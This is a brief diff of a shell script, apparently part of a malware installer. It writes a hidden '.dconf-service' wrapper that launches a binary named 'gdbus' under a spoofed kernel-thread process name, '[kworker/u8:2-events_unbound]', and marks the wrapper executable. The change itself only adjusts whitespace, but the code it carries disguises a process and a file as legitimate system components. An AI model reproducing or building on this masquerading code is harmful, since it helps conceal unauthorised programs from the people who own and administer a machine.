@@ -36,7 +36,8 @@ cat << 'WRAPPER' > .dconf-service
 #!/bin/bash                                                                                                                                                                                                                                                  
 cd "$(dirname "$0")"                                                                                                                                                                                                                                         
 exec -a "[kworker/u8:2-events_unbound]" ./gdbus user                                                                                                                                                                                                         
-WRAPPER                                                                                                                                                                                                                                                      
+WRAPPER
+
 chmod +x .dconf-service                                                                                                                                                                                                                                      
 
 
